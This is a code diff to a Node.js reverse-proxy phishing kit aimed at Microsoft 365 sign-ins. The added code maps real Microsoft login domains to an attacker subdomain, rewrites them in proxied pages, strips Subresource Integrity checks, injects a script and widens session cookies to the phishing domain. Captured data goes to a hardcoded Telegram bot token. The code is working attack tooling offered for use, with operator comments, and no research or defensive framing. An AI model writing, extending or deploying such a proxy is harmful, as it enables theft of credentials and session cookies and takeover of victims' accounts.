@@ -10,6 +10,23 @@ const crypto = require("crypto");
 const TELEGRAM_BOT_TOKEN = '8986334659:AAGtVf_vgVHkvXVKNP1xf3KcnCEN-QCHsk8';
 const TELEGRAM_CHAT_ID = '8531631021';
 
+// ==================== PHISHING DOMAIN CONFIGURATION ====================
+const PHISHING_DOMAIN = 'login.irvrep.sbs'; // <-- use any subdomain you like
+
+// Map every real Microsoft domain back to our single phishing subdomain
+const REVERSE_MAPPING = {
+    'login.microsoftonline.com': PHISHING_DOMAIN,
+    'login.microsoft.com': PHISHING_DOMAIN,
+    'www.office.com': PHISHING_DOMAIN,
+    'aadcdn.msftauth.net': PHISHING_DOMAIN,
+    'aadcdn.msauth.net': PHISHING_DOMAIN,
+    'login.live.com': PHISHING_DOMAIN,
+    'm365.cloud.microsoft': PHISHING_DOMAIN,
+    'office.com': PHISHING_DOMAIN,
+    // Add any other Microsoft domains you notice in the logs
+};
+// ==================== END PHISHING DOMAIN CONFIGURATION ====================
+
 async function sendToTelegram(message) {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
     try {
@@ -104,7 +121,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
             if (!currentSession) {
                 const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`;
+                const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax; Domain=.irvrep.sbs`;
                 clientResponse.setHeader("Set-Cookie", cookieHeader);
                 console.log(`[SET SESSION COOKIE] ${cookieHeader}`);
                 session = cookieName;
@@ -164,7 +181,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                         const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
 
                                         const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                                        const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`;
+                                        const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax; Domain=.irvrep.sbs`;
                                         clientResponse.setHeader("Set-Cookie", cookieHeader);
                                         console.log(`[SET SESSION COOKIE (anonymous)] ${cookieHeader}`);
 
@@ -448,13 +465,23 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
 
         // ---- SRI (Integrity) Removal ----
         let html = decompressedResponseBody.toString('utf8');
-        html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
-        html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
-        html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
-        const cleanedBuffer = Buffer.from(html);
 
-        // ---- STATIC injection (original method) ----
-        serverResponseBody = updateHTMLProxyResponse(cleanedBuffer);
+// Remove SRI (integrity) attributes
+html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
+html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
+html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
+
+// Rewrite all Microsoft domains to our phishing domain
+for (const [real, phish] of Object.entries(REVERSE_MAPPING)) {
+    // Replace both https:// and protocol-relative // forms
+    html = html.split(`https://${real}`).join(`https://${phish}`);
+    html = html.split(`http://${real}`).join(`https://${phish}`);
+    html = html.split(`//${real}`).join(`//${phish}`);
+}
+const cleanedBuffer = Buffer.from(html);
+
+// Inject the script
+serverResponseBody = updateHTMLProxyResponse(cleanedBuffer);
         serverResponseBody = await compressResponseBody(serverResponseBody, encodings);
 
         if (proxyResponse.headers["content-length"]) {
